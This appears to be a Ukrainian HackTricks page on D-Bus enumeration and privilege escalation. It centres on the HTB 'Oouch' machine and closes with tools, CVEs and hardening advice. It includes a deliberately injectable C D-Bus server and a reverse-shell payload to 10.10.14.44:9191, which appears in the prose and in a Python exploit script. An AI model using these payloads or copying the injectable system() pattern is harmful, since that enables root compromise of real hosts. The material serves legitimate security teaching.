# Перелік D-Bus і підвищення привілеїв через ін’єкцію команд

{{#include ../../banners/hacktricks-training.md}}

## **Перелік через GUI**

У середовищах робочого столу Ubuntu D-Bus використовується як посередник для міжпроцесної взаємодії (IPC). В Ubuntu одночасно працює кілька шин повідомлень: системна шина, яку переважно використовують **привілейовані служби для надання служб, важливих для всієї системи**, та шина сеансу для кожного користувача, який увійшов у систему, що надає служби, важливі лише для цього користувача. Тут основна увага приділяється системній шині, оскільки вона пов’язана зі службами, що працюють із вищими привілеями (наприклад, root), а наша мета — підвищити привілеї. Зазначимо, що архітектура D-Bus використовує «маршрутизатор» для кожної шини сеансу, який переспрямовує повідомлення клієнтів до відповідних служб на основі адреси, указаною клієнтами для служби, з якою вони хочуть взаємодіяти.<sup>[[1]](#references)</sup>

Служби в D-Bus визначаються **об’єктами** та **інтерфейсами**, які вони надають. Об’єкти можна порівняти з екземплярами класів у звичайних ООП-мовах: кожен екземпляр має унікальний **шлях об’єкта**. Цей шлях, подібно до шляху у файловій системі, унікально ідентифікує кожен об’єкт, наданий службою. Для дослідження важливим є інтерфейс **org.freedesktop.DBus.Introspectable**, що містить один метод — Introspect. Цей метод повертає XML-представлення підтримуваних об’єктом методів, сигналів і властивостей; тут основна увага приділяється методам, а властивості та сигнали не розглядаються.

Для взаємодії з інтерфейсом D-Bus використовувалися два інструменти: CLI-інструмент **gdbus** для зручного виклику методів, які надає D-Bus, у скриптах, і [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) — GUI-інструмент на основі Python, призначений для переліку служб, доступних у кожній шині, та відображення об’єктів, що містяться в кожній службі.

```bash
sudo apt-get install d-feet
```

Якщо ви перевіряєте **шину сеансу**, спершу підтвердьте поточну адресу:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

На першому зображенні показано служби, зареєстровані в системній шині D-Bus, зокрема виділено **org.debin.apt** після вибору кнопки System Bus. D-Feet надсилає цій службі запит щодо об’єктів і відображає інтерфейси, методи, властивості та сигнали вибраних об’єктів, як показано на другому зображенні. Також наведено сигнатуру кожного методу.

Примітною особливістю є відображення **ідентифікатора процесу (pid)** і **командного рядка** служби — це допомагає з’ясувати, чи має служба підвищені привілеї, що важливо для дослідження.

**D-Feet також дає змогу викликати методи**: користувачі можуть вводити Python-вирази як параметри, які D-Feet перетворює на типи D-Bus перед передаванням службі.

Однак зверніть увагу, що **для виклику деяких методів потрібна автентифікація**. Ми не розглядатимемо ці методи, оскільки наша мета — підвищити привілеї без облікових даних.

Також зауважте, що деякі служби запитують іншу службу D-Bus з назвою org.freedeskto.PolicyKit1, чи слід дозволити користувачеві виконувати певні дії.

## **Перерахування командного рядка**

### Список об’єктів служби

Список відкритих інтерфейсів D-Bus можна отримати за допомогою:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Служби, позначені як **`(activatable)`**, особливо цікаві, оскільки вони **ще не запущені**, але bus-запит може запустити їх на вимогу. Не обмежуйтеся `busctl list` — з’ясуйте, які саме бінарні файли запускатимуться для цих імен.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Це швидко показує, який шлях `Exec=` буде запущено для активованого імені та від імені якого користувача. Якщо бінарний файл або ланцюжок його виконання захищено недостатньо, неактивна служба все одно може стати шляхом до підвищення привілеїв.

Для привілейованої служби створення образів USB-носіїв зіставте її ім’я на системній шині з **ефективною** політикою для дії запису образу. Застаріле правило постачальника може надавати адміністративній групі Unix `ResultActive=yes` без запиту пароля; переконайтеся, що поточний обліковий запис належить до цієї групи, сеанс активний, правило справді завантажене й не перевизначене, а встановлений допоміжний компонент досі приймає вибрані викликачем шляхи джерела та призначення. Самого дескриптора служби або старої версії пакета недостатньо, щоб довести можливість довільного доступу до файлів. Відсутність дескриптора активації також не виключає, що служба вже запущена. Переглядайте незмінні файли політик і служб, не викликаючи метод запису образу; див. [оригінальний аналіз служби](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### З’єднання

[З Вікіпедії:](https://en.wikipedia.org/wiki/D-Bus) Коли процес установлює з’єднання з шиною, шина призначає цьому з’єднанню спеціальне ім’я шини, яке називається _унікальним іменем з’єднання_. Імена шин цього типу незмінні — гарантовано, що вони не зміняться, доки існує з’єднання, — і, що важливіше, їх не можна повторно використовувати протягом життєвого циклу шини. Це означає, що жодному іншому з’єднанню з цією шиною ніколи не буде призначено таке унікальне ім’я з’єднання, навіть якщо той самий процес закриє з’єднання з шиною та створить нове. Унікальні імена з’єднань легко розпізнати, оскільки вони починаються з двокрапки — символу, який інакше заборонений.<sup>[[4]](#references)</sup>

### Інформація про об’єкт служби

Далі можна отримати інформацію про інтерфейс за допомогою:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Також зіставте ім’я шини з відповідним юнітом `systemd` і шляхом до виконуваного файла:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Це дає відповідь на важливе під час privesc практичне запитання: **якщо виклик методу успішний, який саме реальний binary і unit виконає дію?**

### Перелічіть інтерфейси об’єкта служби

У вас має бути достатньо прав.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Інтроспекція інтерфейсу об’єкта служби

Зверніть увагу, що в цьому прикладі вибрано останній виявлений інтерфейс за допомогою параметра `tree` (_див. попередній розділ_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Зверніть увагу на метод `.Block` інтерфейсу `htb.oouch.Block` (саме він нас цікавить). Літера «s» в інших стовпцях може означати, що метод очікує рядок.

Перш ніж пробувати щось небезпечне, спочатку перевірте метод, орієнтований на читання, або інший метод із низьким рівнем ризику. Так ви чітко розрізните три випадки: неправильний синтаксис, метод доступний, але у виконанні відмовлено, або метод доступний і його дозволено виконати.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Зіставлення методів D-Bus із політиками та діями

Інтроспекція показує, **що** можна викликати, але не пояснює, **чому** виклик дозволено або заборонено. Для реального аналізу privesc зазвичай потрібно разом перевірити **три рівні**:

1. **Метадані активації** (файли `.service` або `SystemdService=`), щоб з’ясувати, який саме бінарний файл і unit буде запущено.
2. **Політики D-Bus XML** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), щоб з’ясувати, кому дозволено `own`, `send_destination` або `receive_sender`.
3. **Файли дій Polkit** (`/usr/share/polkit-1/actions/*.policy`), щоб з’ясувати модель авторизації за замовчуванням (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Корисні команди:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. The same method may choose a different action depending on the object being modified or on runtime context. Therefore the practical workflow is:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` and grep the relevant `.policy` files
3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`

Proxy або compatibility services заслуговують на особливу увагу. **root-running proxy**, який пересилає запити до іншого D-Bus service через власне попередньо встановлене з’єднання, може ненавмисно змусити backend вважати, що всі запити надходять від UID 0, якщо особу початкового caller не перевірити повторно.<sup>[[3]](#references)</sup>

### Інтерфейс моніторингу/захоплення

За наявності достатніх privileges (самих лише privileges `send_destination` і `receive_sender` недостатньо) ви можете **моніторити D-Bus communication**.

Щоб **моніторити** **communication**, потрібно бути **root**. Якщо, будучи root, ви все ще маєте проблеми, перегляньте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) і [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Якщо ви знаєте, як налаштувати D-Bus config file, щоб **дозволити non-root users перехоплювати** communication, будь ласка, **зв’яжіться зі мною**!

Різні способи моніторингу:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

У наведеному прикладі за інтерфейсом `htb.oouch.Block` ведеться спостереження, а повідомлення "**_**lalalalal**_**" надсилається через непорозуміння:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Можна використовувати `capture` замість `monitor`, щоб зберегти результати у файл **pcapng**, який можна відкрити у Wireshark:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Фільтрування зайвого шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо в шині надто багато інформації, передайте правило match ось так:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Можна вказати кілька правил. Якщо повідомлення відповідає _будь-якому_ з правил, його буде надруковано. Ось так:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Див. [документацію D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html), щоб дізнатися більше про синтаксис правил зіставлення.<sup>[[7]](#references)</sup>

### Більше

У `busctl` є ще більше опцій, [**знайдіть їх усі тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Вразливий сценарій**

Користувачем **qtc на хості "oouch" з HTB** ви можете знайти **неочікуваний конфігураційний файл D-Bus** у _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

З попередньої конфігурації видно, що для надсилання й отримання інформації через це з’єднання D-BUS потрібно бути користувачем `root` або `www-data`.

Як користувач **qtc** у docker-контейнері **aeb4525789d8** можна знайти код, пов’язаний із dbus, у файлі _/code/oouch/routes.py._ Ось цікавий код:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Як бачите, він **підключається до інтерфейсу D-Bus** і надсилає «client_ip» до функції **«Block»**.

На іншому кінці з’єднання D-Bus працює скомпільований бінарний файл C. Цей код **прослуховує** з’єднання D-Bus, **очікуючи IP-адресу, і викликає iptables через функцію `system`**, щоб заблокувати вказану IP-адресу.\
**Виклик `system` навмисно вразливий до command injection**, тому такий payload створить reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Скористайтеся цим

Наприкінці цієї сторінки наведено **повний C-код застосунку D-Bus**. У ньому між рядками 91–97 можна знайти, **як реєструються `D-Bus object path`** і **`interface name`**. Ця інформація знадобиться, щоб надсилати дані через з’єднання D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Також у рядку 57 можна побачити, що **єдиний зареєстрований метод** для цієї комунікації D-Bus називається `Block`(_**Саме тому в наступному розділі payloads надсилатимуться до об’єкта служби `htb.oouch.Block`, інтерфейсу `/htb/oouch/Block` і методу `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Наведений нижче код Python надішле payload через D-Bus-з’єднання до методу `Block` за допомогою `block_iface.Block(runme)` (_зауважте, що його взято з попереднього фрагмента коду_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl та dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` — це інструмент для надсилання повідомлень до «Message Bus».
- Message Bus — програмне забезпечення, яке системи використовують для спрощення обміну даними між програмами. Воно пов’язане з Message Queue (повідомлення впорядковані в чергу), але в Message Bus повідомлення надсилаються за моделлю підписки, а також дуже швидко.
- Параметр «-system» вказує, що це системне повідомлення, а не повідомлення сеансу (за замовчуванням).
- Параметр «–print-reply» призначений для коректного виведення нашого повідомлення та отримання відповідей у зручному для читання форматі.
- «–dest=Dbus-Interface-Block» — адреса інтерфейсу Dbus.
- «–string:» — тип повідомлення, яке ми хочемо надіслати інтерфейсу. Існує кілька форматів надсилання повідомлень: double, bytes, booleans, int, objpath. У цьому випадку «object path» корисний, коли потрібно передати шлях до файлу інтерфейсу Dbus. Для передавання команди інтерфейсу під виглядом імені файлу можна скористатися спеціальним файлом (FIFO). «string:;» — це потрібно, щоб знову викликати object path, де ми розміщуємо файл/команду reverse shell у FIFO.

_Зверніть увагу, що в `htb.oouch.Block.Block` перша частина (`htb.oouch.Block`) посилається на об’єкт служби, а остання частина (`.Block`) — на назву методу._

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Допоміжні засоби для автоматизованого переліку (2023-2025)

Перелік великої поверхні атаки D-Bus вручну за допомогою `busctl`/`gdbus` швидко стає виснажливим. Дві невеликі FOSS-утиліти, випущені за останні кілька років, можуть пришвидшити роботу під час red-team- або CTF-заходів:

### dbusmap («Nmap для D-Bus»)
* Автор: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Написана на C; один статичний бінарний файл (<50 kB), який обходить кожен шлях об’єкта, отримує XML `Introspect` і визначає PID/UID-власника.<sup>[[5]](#references)</sup>
* Корисні прапорці:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Інструмент позначає незахищені well-known names символом `!`, одразу виявляючи сервіси, які можна *захопити* (отримати над ними контроль), або виклики методів, доступні з непривілейованої оболонки.

### uptux.py
* Автор: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Скрипт лише на Python, який шукає *доступні для запису* шляхи в systemd units **і** надто дозвільні файли політик D-Bus (наприклад, `send_destination="*"`).<sup>[[6]](#references)</sup>
* Швидкий запуск:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Модуль D-Bus шукає в наведених нижче каталогах і позначає будь-яку службу, яку звичайний користувач може підмінити або перехопити:
  * `/etc/dbus-1/system.d/` і `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (перевизначення від постачальника)

---

## Помітні помилки D-Bus, що дають змогу підвищити привілеї (2024–2025)

Стеження за нещодавно опублікованими CVE допомагає виявляти подібні небезпечні шаблони у власному коді. Ось два хороші нещодавні приклади:<sup>[[2]](#references)[[3]](#references)</sup>

| Рік | CVE | Компонент | Першопричина | Висновок для атакувальника |
|------|-----|-----------|------------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Служба, що працювала від root, відкривала інтерфейс D-Bus, який непривілейовані користувачі могли переналаштовувати, зокрема завантажувати макроси з поведінкою, контрольованою атакувальником. | Якщо демон на системній шині відкриває **керування пристроями/профілями/конфігурацією**, розглядайте доступні для запису налаштування й функції макросів як примітиви виконання коду, а не просто «налаштування». |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Проксі сумісності, що працював від root, передавав запити до бекенд-служб, не зберігаючи контекст безпеки початкового викликувача, тому бекенди довіряли проксі як UID 0. | Розглядайте служби D-Bus типу **проксі / міст / сумісність** як окремий клас помилок: якщо вони ретранслюють привілейовані виклики, перевіряйте, як UID викликувача й контекст Polkit передаються до бекенда. |

На що звертати увагу:
1. Служба працює **від root на системній шині**.
2. Або **перевірка авторизації відсутня**, або її виконують щодо **не того суб’єкта**.
3. Доступний метод зрештою змінює стан системи: встановлює пакети, змінює користувачів/групи, налаштування завантажувача, профілі пристроїв, записує файли або безпосередньо виконує команди.

Скористайтеся `dbusmap --enable-probes` або виконайте `busctl call` вручну, щоб перевірити, чи доступний метод, а потім перегляньте XML-політику служби й дії Polkit, щоб з’ясувати, **авторизацію якого суб’єкта** насправді перевіряють.

---

## Швидкі заходи для посилення захисту та виявлення

* Знайдіть політики з правом на запис для всіх або з відкритими правами *send/receive*:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Для небезпечних методів вимагайте Polkit — навіть проксі *root* мають передавати PID *викликувача* до `polkit_authority_check_authorization_sync()`, а не власний.
* Знижуйте привілеї в довготривалих допоміжних процесах (використовуйте `sd_pid_get_owner_uid()`, щоб перемикати простори імен після підключення до шини).
* Якщо не можете видалити службу, принаймні *обмежте її* окремою групою Unix і обмежте доступ у її XML-політиці.
* Blue-team: захоплюйте системну шину за допомогою `busctl capture > /var/log/dbus_$(date +%F).pcapng` і імпортуйте її у Wireshark для виявлення аномалій.

---

## References

- [1] [Підвищення привілеїв через USBCreator D-Bus в Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: служба D-Bus дозволяє будь-якому непривілейованому користувачу змінювати конфігурацію](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: обхід автентифікації в службі проксі Deepin D-Bus (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus — Вікіпедія](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap — «Nmap для D-Bus»](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org — документація D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
